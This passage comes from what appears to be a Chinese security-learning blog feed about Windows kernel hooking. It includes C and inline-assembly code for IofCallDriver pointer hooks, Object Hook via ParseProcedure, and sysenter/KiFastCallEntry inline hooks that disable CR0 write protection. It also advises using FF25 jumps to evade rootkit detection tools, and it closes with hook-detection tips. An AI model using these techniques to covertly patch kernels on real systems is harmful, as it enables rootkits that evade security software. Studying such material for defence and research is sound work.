class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">void HookpIofCallDriver()</div><div class="line">&#123;</div><div class="line">KIRQL oldIrql<span class="comment">;</span></div><div class="line">ULONG addr = (ULONG)IofCallDriver<span class="comment">;</span></div><div class="line">//保存原始的IofCallDriver函数地址</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, addr</div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">eax</span> + <span class="number">2</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">esi</span>]</div><div class="line"><span class="keyword">mov</span> old_piofcalldriver, <span class="built_in">eax</span></div><div class="line">&#125;</div><div class="line">//引发硬件优先IRQL</div><div class="line">oldIrql = KeRaiseIrqlToDpcLevel()<span class="comment">;</span></div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">cr0</span></div><div class="line"><span class="keyword">mov</span> oData, <span class="built_in">eax</span></div><div class="line"><span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">0xffffffff</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cr0</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, addr<span class="comment">; IofCallDriver</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">eax</span> + <span class="number">2</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">esi</span>], offset NewpIofCallDriver<span class="comment">; 写入新的数据</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, oData<span class="comment">;恢复cr0的数据</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cr0</span>, <span class="built_in">eax</span></div><div class="line">&#125;</div><div class="line">KeLowerIrql(oldIrql)<span class="comment">;</span></div><div class="line">return<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><ul><li>本文作者：<ul><li><a href="https://www.cnblogs.com/LittleHann/p/3450436.html" target="_blank" rel="external">https://www.cnblogs.com/LittleHann/p/3450436.html</a></li><li><a href="https://bbs.pediy.com/thread-60022.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-60022.htm</a></li></ul></li></ul><h1 id="0x6-Object-Hook"><a href="#0x6-Object-Hook" class="headerlink" title="0x6 Object Hook"></a>0x6 Object Hook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先讲解一个重要的结构体<code>_OBJECT_HEADER</code>,使用WINDBG用<code>dt _OBJECT_HEADER</code>命令即可显示如下：<br>    <img src="http://hacky.wang/blog/20190515/fUeMbC0WtqpB.png?imageslim" alt="mark">  </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef <span class="class"><span class="keyword">struct</span> <span class="title">_OBJECT_HEADER</span> &#123; </span></div><div class="line">  LONG PointerCount; </div><div class="line">  <span class="class"><span class="keyword">union</span> &#123; </span></div><div class="line">    LONG HandleCount; </div><div class="line">    PSINGLE_LIST_ENTRY SEntry; </div><div class="line">  &#125;; </div><div class="line">  POBJECT_TYPE Type; <span class="regexp">//</span>这个很重要HOOK就靠它，对象类型结构也是一个对象，TYPE它是系统第一个创建出来的对象类型 </div><div class="line">  UCHAR NameInfoOffset; <span class="regexp">//</span>OBJECT_HEADER_NAME_INFO 偏移</div><div class="line">  UCHAR HandleInfoOffset; <span class="regexp">//</span>OBJECT_HEADER_HANDLE_INFO 偏移</div><div class="line">  UCHAR QuotaInfoOffset; </div><div class="line">  UCHAR Flags; </div><div class="line">  <span class="class"><span class="keyword">union</span> </span></div><div class="line">  &#123; </div><div class="line">    POBJECT_CREATE_INFORMATION ObjectCreateInfo; </div><div class="line">    PVOID QuotaBlockCharged; </div><div class="line">  &#125;;</div><div class="line">  PSECURITY_DESCRIPTOR SecurityDescriptor; </div><div class="line">  QUAD Body;<span class="regexp">//</span>对象本身 </div><div class="line">&#125; OBJECT_HEADER, *POBJECT_HEADER;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，我们来看一下OBJECT_TYPE，同样的使用windbg<code>dt _OBJECT_TYPE</code>即可查看<br>     <img src="http://hacky.wang/blog/20190515/mzRhPtvTOhvn.png?imageslim" alt="mark"><br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//对象类型结构</div><div class="line">typedef struct _OBJECT_TYPE &#123; </div><div class="line">  <span class="type">ERESOURCE</span> <span class="type">Mutex</span>; </div><div class="line">  <span class="type">LIST_ENTRY</span> <span class="type">TypeList</span>; //队列</div><div class="line">  <span class="type">UNICODE_STRING</span> <span class="type">Name</span>; </div><div class="line">  <span class="type">PVOID</span> <span class="type">DefaultObject</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">Index</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">TotalNumberOfObjects</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">TotalNumberOfHandles</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">HighWaterNumberOfObjects</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">HighWaterNumberOfHandles</span>; </div><div class="line">  <span class="type">OBJECT_TYPE_INITIALIZER</span> <span class="type">TypeInfo</span>; //这个很重要，下面讲这个结构</div><div class="line">||#ifdef <span class="type">POOL_TAGGING</span> </div><div class="line">  <span class="type">ULONG</span> <span class="type">Key</span>; </div><div class="line">||#endif </div><div class="line">&#125; <span class="type">OBJECT_TYPE</span>, *<span class="type">POBJECT_TYPE</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于对象类型结构，主要的层次结构像一个树形或者说目录形。其主要的对象类型比如<em>IoFileObjectType，</em>PsProcessType，*PsThreadType。都是存在于ObjectTypes\Device。所以，只要生成对象就会创建指定的对象类型结构。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后讲解一下关于最后一个结构体<code>OBJECT_TYPE_INITIALIZER</code>,使用<code>dt _OBJECT_TYPE_INITIALIZER</code>就可以查看<code>_OBJECT_TYPE_INITIALIZER</code>的数据。在这个结构体中，最后8个函数指针是关乎HOOK的，这些函数能够决定对象的操作，比如说打开，创建，删除等。<br>    <img src="http://hacky.wang/blog/20190515/RqnqFHLYoAdO.png?imageslim" alt="mark"></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _OBJECT_TYPE_INITIALIZER &#123;</div><div class="line">  <span class="type">USHORT</span> <span class="type">Length</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">UseDefaultObject</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">CaseInsensitive</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">InvalidAttributes</span>;</div><div class="line">  <span class="type">GENERIC_MAPPING</span> <span class="type">GenericMapping</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">ValidAccessMask</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">SecurityRequired</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">MaintainHandleCount</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">MaintainTypeList</span>;</div><div class="line">  <span class="type">POOL_TYPE</span> <span class="type">PoolType</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">DefaultPagedPoolCharge</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">DefaultNonPagedPoolCharge</span>;</div><div class="line">  <span class="type">PVOID</span> <span class="type">DumpProcedure</span>;</div><div class="line">  <span class="type">PVOID</span> <span class="type">OpenProcedure</span>;        //这几个函数指针就是我们最需要的</div><div class="line">  <span class="type">PVOID</span> <span class="type">CloseProcedure</span>;       //这些函数都是决定你的对象的的一些</div><div class="line">  <span class="type">PVOID</span> <span class="type">DeleteProcedure</span>;      //操作或者叫方法，比如打开 创建 删除</div><div class="line">  <span class="type">PVOID</span> <span class="type">ParseProcedure</span>;       //不同的对象类型(<span class="type">OBJECT_TYPE</span>)操作也不同</div><div class="line">  <span class="type">PVOID</span> <span class="type">SecurityProcedure</span>;    </div><div class="line">  <span class="type">PVOID</span> <span class="type">QueryNameProcedure</span>;   </div><div class="line">  <span class="type">PVOID</span> <span class="type">OkayToCloseProcedure</span>;</div><div class="line">&#125; <span class="type">OBJECT_TYPE_INITIALIZER</span>, *<span class="type">POBJECT_TYPE_INITIALIZER</span>；</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当你调用NtCreateFile-&gt;IoCreateFile-&gt;ObOpenObjectByName-&gt;ObpLookupObjectName-&gt;IopParseFile-&gt;IopParseDevice<br>IopParseFile最终也会调用IopParseDevice<br>ObjectHook其实就是比如你要HOOK 创建打开就是OBJECT_TYPE_INITIALIZER-&gt;ParseProcedure，所以ObjectHook的关键就是Hook  OBJECT_TYPE_INITIALIZER最后几个关键的函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实现代码如下<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">NTSTATUS Hook()</div><div class="line">&#123;</div><div class="line">NTSTATUS  Status;</div><div class="line"><span class="keyword">HANDLE</span> hFile;</div><div class="line">UNICODE_STRING Name;</div><div class="line">OBJECT_ATTRIBUTES Attr;</div><div class="line">IO_STATUS_BLOCK ioStaBlock;</div><div class="line">PVOID pObject = <span class="built_in">NULL</span>;</div><div class="line">RtlInitUnicodeString(&amp;Name, L<span class="string">"\\Device\\HarddiskVolume1\\1.txt"</span>);</div><div class="line">InitializeObjectAttributes(&amp;Attr,</div><div class="line">&amp;Name, </div><div class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, </div><div class="line"><span class="number">0</span>, <span class="built_in">NULL</span>);</div><div class="line">Status = ZwOpenFile(&amp;hFile,</div><div class="line">GENERIC_ALL,</div><div class="line">&amp;Attr,</div><div class="line">&amp;ioStaBlock, </div><div class="line"><span class="number">0</span>, FILE_NON_DIRECTORY_FILE);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status))</div><div class="line">&#123;</div><div class="line">KdPrint((<span class="string">"File is Null\n"</span>));</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取访问对象的句柄</span></div><div class="line">Status = ObReferenceObjectByHandle(hFile, GENERIC_ALL, <span class="built_in">NULL</span>, KernelMode, &amp;pObject, <span class="built_in">NULL</span>);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status))</div><div class="line">&#123;</div><div class="line">KdPrint((<span class="string">"Object is Null\n"</span>));</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div><div class="line">KdPrint((<span class="string">"pobject is %08X\n"</span>, pObject));</div><div class="line">addrs = OBJECT_TO_OBJECT_HEADER(pObject);<span class="comment">//获取对象头</span></div><div class="line"><span class="comment">//POBJECT_TYPE</span></div><div class="line">pType = addrs-&gt;<span class="keyword">Type</span>;<span class="comment">//获取对象类型结构 object-10h</span></div><div class="line">KdPrint((<span class="string">"pType is %08X\n"</span>, pType));</div><div class="line"><span class="comment">//保存原始地址</span></div><div class="line"><span class="comment">//POBJECT_TYPE-&gt;OBJECT_TYPE_INITIALIZER.ParseProcedure</span></div><div class="line">OldParseProcedure = pType-&gt;TypeInfo.ParseProcedure;<span class="comment">//获取服务函数原始地址OBJECT_TYPE+9C位置为打开</span></div><div class="line">KdPrint((<span class="string">"OldParseProcedure addrs is %08X\n"</span>, OldParseProcedure));</div><div class="line">KdPrint((<span class="string">"addrs is %08X\n"</span>, addrs));</div><div class="line"><span class="comment">//MDL去掉内存保护</span></div><div class="line">__asm</div><div class="line">&#123;</div><div class="line">cli;</div><div class="line">mov eax, cr0;</div><div class="line"><span class="literal">and</span> eax, <span class="literal">not</span> <span class="number">10000</span>h;</div><div class="line">mov cr0, eax;</div><div class="line">&#125;</div><div class="line"><span class="comment">//hook</span></div><div class="line">pType-&gt;TypeInfo.ParseProcedure = NewParseProcedure;</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line">mov eax, cr0;</div><div class="line"><span class="literal">or</span> eax, <span class="number">10000</span>h;</div><div class="line">mov cr0, eax;</div><div class="line">sti;</div><div class="line">&#125;</div><div class="line">Status = ZwClose(hFile);</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><ul><li>本文作者：<ul><li><a href="https://blog.csdn.net/whatday/article/details/13626947" target="_blank" rel="external">https://blog.csdn.net/whatday/article/details/13626947</a></li><li><a href="http://www.blogfshare.com/object-hook.html" target="_blank" rel="external">http://www.blogfshare.com/object-hook.html</a></li><li><a href="https://www.write-bug.com/article/2136.html" target="_blank" rel="external">https://www.write-bug.com/article/2136.html</a></li><li><a href="https://bbs.pediy.com/thread-203767.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-203767.htm</a></li></ul></li></ul><h1 id="0x7-sysenterHook"><a href="#0x7-sysenterHook" class="headerlink" title="0x7 sysenterHook"></a>0x7 sysenterHook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sysenter是由目态进入管态的CPU支持的快速系统调用的一条指令。在此之前，系统的切换是使用<code>int 0x2E</code>系统中断实现的。但是这样做的弊端是操作是非原子的，因为要进行大量的栈切换，需要多次访问内存。所以在后来使用了新的切换指令—<code>sysenter/sysexit</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为sysenter的原子性，这决定了管态和目态的无论是堆栈还是指令上的切换都是可以通过一条指令来实现，当然，同时，CPU也为其配备了相对应的寄存器。分别是<code>SYSENTER_CS_MSR:0x174</code>,<code>SYSENTER_ESP_MSR:0x175</code>,<code>SYSENTER_EIP_MSR:0x176</code>。并且我们可以通过rdmsr和wrmsr进行读写这三个寄存器。由于CS和EIP可以决定程序的流程，所以我们如何修改了SYSENTER_CS_MSR和SYSENTER_EIP_MSR的数据，将流程劫持到我们想要的路径，这样就实现了一次Hook。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hook流程大概是这样的<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="comment">//读取IA32_SYSENTER_EIP</span></div><div class="line"><span class="keyword">mov</span> ecx, 0x176</div><div class="line">rdmsr</div><div class="line"><span class="comment">//保存原始数据</span></div><div class="line"><span class="comment">//作用无非有二，第一为了回调该函数，第二为了卸载Hook的时候方便恢复。</span></div><div class="line"><span class="keyword">mov</span> d_origKiFastCallEntry eax</div><div class="line"><span class="comment">//Hook</span></div><div class="line"><span class="keyword">mov</span> eax,MyKiFastCallEntry</div><div class="line">wrmsr</div><div class="line">&#125;</div><div class="line"><span class="comment">//摘录自：https://bbs.pediy.com/thread-60247.htm</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是上面的方法直接修改寄存器数据，这样容易被Hook检测工具检测，一般检测工具对于常见sysenterHook检测基于寄存器的值是否超过本模块范围，对于InlineHook一般检测函数起始数据是否是0xE9，然后检测后面的地址是否超过当前模块范围。如果我们使用FF25这类的转移指令，这样是不容易被察觉的。起始接下来的方法并不是严格意义上的sysenterHook,更像是属于InlineHook。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">OID HookSysenter()</div><div class="line">&#123;</div><div class="line">UCHAR  cHookCode[<span class="number">8</span>] = &#123; <span class="number">0x57</span>,          <span class="comment">//push edi       第一跳,从KiFastCall跳到MyKiFastCallEntry.并绕过rootkit检测工具检测</span></div><div class="line">    <span class="number">0xBF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  <span class="comment">//mov  edi,0000  0000需要被填充</span></div><div class="line"><span class="number">0xFF</span>,<span class="number">0xE7</span> &#125;;   <span class="comment">//jmp  edi</span></div><div class="line">UCHAR  JmpCode[] = &#123;<span class="number">0xE9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;       <span class="comment">//jmp 0000 第三跳,从KiFastCall函数头代码跳转到原来KiFastCall+N</span></div><div class="line">int    nCopyLen = <span class="number">0</span>;</div><div class="line">int    nPos = <span class="number">0</span>;</div><div class="line"><span class="comment">//得到KiFastCallEntry地址</span></div><div class="line"><span class="comment">//但是也存在使用rdmsr读取的IP并不是KiFastCallEntry地址</span></div><div class="line">ULONG uSysenter=NULL;</div><div class="line">__asm &#123;</div><div class="line">mov ecx, <span class="number">0x176</span></div><div class="line">rdmsr</div><div class="line">mov uSysenter, eax  </div><div class="line">&#125;</div><div class="line">DbgPrint(<span class="string">"sysenter:0x%08X"</span>, uSysenter);</div><div class="line"><span class="comment">//我们要改写的函数头至少需要8字节 这里计算实际需要COPY的代码长度 因为我们不能把一条完整的指令打断</span></div><div class="line">nPos = uSysenter;</div><div class="line">while (nCopyLen &lt; <span class="number">8</span>) &#123;</div><div class="line">nCopyLen += GetOpCodeSize((PVOID)nPos);  </div><div class="line">nPos = uSysenter + nCopyLen;</div><div class="line">&#125;</div><div class="line"><span class="comment">//保存原是的前八个字节代码</span></div><div class="line">ULONG uOrigSysenterHead[<span class="number">8</span>];</div><div class="line">DbgPrint(<span class="string">"copy code lenght:%d"</span>, nCopyLen);</div><div class="line">PVOID pMovedSysenterCode = ExAllocatePool(NonPagedPool, <span class="number">20</span>);</div><div class="line">memcpy(uOrigSysenterHead, (PVOID)uSysenter, <span class="number">8</span>);</div><div class="line"><span class="comment">//计算跳转地址</span></div><div class="line">*((ULONG*)(JmpCode + <span class="number">1</span>)) = (uSysenter + nCopyLen) - ((ULONG)pMovedSysenterCode + nCopyLen) - <span class="number">5</span>;</div><div class="line"><span class="comment">//保存函数其实不妨原始数据</span></div><div class="line">memcpy(pMovedSysenterCode, (PVOID)uSysenter, nCopyLen); </div><div class="line"><span class="comment">//把跳转代码COPY上去</span></div><div class="line">memcpy((PVOID)(pMovedSysenterCode + nCopyLen), JmpCode, <span class="number">5</span>); </div><div class="line"><span class="comment">//HOOK地址，其实填充的是第二条语句的地址，其实就是InlineHook(A)</span></div><div class="line">*((ULONG*)(cHookCode + <span class="number">2</span>)) = (ULONG)MyKiFastCallEntry; </div><div class="line">DbgPrint(<span class="string">"Saved sysenter code:0x%08X"</span>, pMovedSysenterCode);</div><div class="line">DbgPrint(<span class="string">"MyKiFastCallEntry:0x%08X"</span>, MyKiFastCallEntry);</div><div class="line">__asm &#123;</div><div class="line">cli</div><div class="line">mov  eax, cr0</div><div class="line">and  eax, not <span class="number">10000</span>h</div><div class="line">mov  cr0, eax</div><div class="line">&#125;</div><div class="line">memcpy((PVOID)uSysenter, cHookCode, <span class="number">8</span>);<span class="comment">//把改写原来函数头</span></div><div class="line">__asm &#123;</div><div class="line">mov  eax, cr0</div><div class="line">or eax, <span class="number">10000</span>h</div><div class="line">mov  cr0, eax</div><div class="line">sti</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//摘录自https://bbs.pediy.com/thread-42705.htm</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，<strong>rdmsr对于的IP地址并不一定是KiFastCallEntry，按道理来说其地址应该是KiFastCallEntry，但是我的机器上显示的不是！看看哪位师傅可以给解释一下</strong><br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>: kd&gt; rdmsr <span class="number">176</span></div><div class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span></div><div class="line"><span class="number">0</span>: kd&gt; u <span class="number">80542520</span></div><div class="line">nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+<span class="number">0xa78</span>:</div><div class="line"><span class="number">80542520</span> b923000000      mov     ecx,23h</div><div class="line"><span class="number">80542525</span> 6a30            <span class="built_in">push</span>    30h</div><div class="line"><span class="number">80542527</span> <span class="number">0fa1</span>            <span class="built_in">pop</span>     fs</div><div class="line"><span class="number">80542529</span> 8ed9            mov     ds,cx</div><div class="line">8054252b 8ec1            mov     es,cx</div><div class="line">8054252d 648b0d40000000  mov     ecx,dword ptr fs:[40h]</div><div class="line"><span class="number">80542534</span> <span class="number">8b6104</span>          mov     esp,dword ptr [ecx+<span class="number">4</span>]</div><div class="line"><span class="number">80542537</span> 6a23            <span class="built_in">push</span>    23h</div></pre></td></tr></table></figure></p><ul><li>本文作者<ul><li><a href="https://bbs.pediy.com/thread-60247.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-60247.htm</a></li><li><a href="https://bbs.pediy.com/thread-42705.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-42705.htm</a></li></ul></li></ul><h1 id="0x8-相关事项"><a href="#0x8-相关事项" class="headerlink" title="0x8 相关事项"></a>0x8 相关事项</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分主要讲一下Hook的注意事项和部分大厂关于Hook的面经。部分面经之前讲解了，在这里不做赘述。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是二次HOOK，就是被别人HOOK了之后自己再次HOOK，这里可以提供4种方法，第一可以<strong>换个位置HOOK</strong>。<strong>第二就是替换原HOOK</strong>，也就是说将别人HOOK的指令修改为自己HOOK的指令。这样应该是比较有效的，但是需要注意的是修改指令数量一定要和对方的一致，或者修改之前将原来的HOOK还原，不然容易产生错误。<strong>第三，在Detour函数中HOOK</strong>，<strong>第四，在Target函数中的原来HOOK的地址后面HOOK</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二是X64下HOOK应该注意什么？首先X64和X86本质区别就是地址总线上的差别，一个是2^64次，一次传输64位数据，一个是2^32次，一次传输32位数据。由此造成的差异就是内存地址大小问题，在32位机器上主要是4个字节，64位机器上就变成了8个字节。这样的话对于指针的使用就需要考虑到两个架构上的兼容性和差异性。例如在32下可以使用ULONG，但是在64位下使用ULONG_PTR。这样就可以有效避免由于编码问题产生的异常(或者统一使用ULONG_PTR)。第二就是PE格式上，由于x86和x64PE结构上存在微小差异，所以在进行AddressHook的时候需要注意。<strong>第三可能涉及到跳转的问题</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于地址长度导致跳转指令长度变化。想mov-jmp就需要利用2+8+2的长度进行跳转，又像push-ret的方法，在32位系统下直接push就是32位数据，但是64位下只能push32位数据，这样的话，只能先push低位数据，然后修改高位数据，例如这样：<code>push 55667788h;mov [esp+4],11223344</code>。再如使用jmp[addr]方法。FF25类型jmp在X86平台下是一种绝对偏移的跳转，但是在x64下也是一种相对偏移的跳转。计算公式为当前EIP+0x6(指令长度)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测HOOK：</p><ul><li>1.HOOK修改的是内存中的数据，本地文件却没有修改。可以将本地文件加载到内存中，然后进行对比</li><li>2.对内存模块进行CRC校验</li><li>3.设置回调函数，检测某个IAT或者函数的前几个指令是否被修改</li><li>4.对VirtualProtect函数和WriteProcess函数进行HOOK，检测修改内容的合法性</li><li>5.利用PsSetCreateProcessNotifyRoutineEx注册回调函数，监控进程创建，对比特定的进程，如果创建，设置创建标志为假，创建失败</li><li>6.利用PsSetCreateThreadNotifyRoutine注册回调函数，监控线程创建，通过进程路径.找到对应进程名.判断是否符合，如果是的话.找到回调函数地址( pWin32Address = <em>(UCHAR**)((UCHAR</em>)Thread + 0x410);)并改为C3</li><li>7.利用PsSetLoadImageNotifyRoutine拦截模块，首先需要获取模块基地址(让其载入)，PE寻找基地址，解析到OEP，修改oep为ret即可</li><li><a href="https://bbs.pediy.com/thread-224514.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-224514.htm</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1.这是《一篇文章带你….》系列的第三篇，也是自己的学习总结，很多不懂的地方找的论坛前辈的资料。代码都是自己手敲，边敲边注释，对一些细节做了微调。前两篇是&lt;a href=&quot;https://bbs.pediy.com/thread-251148.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;一篇文章带你学会Armadillo脱壳&lt;/a&gt;和&lt;a href=&quot;https://bbs.pediy.com/thread-250924.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;一篇文章带你理解PE三表 &lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你理解PE三表</title>
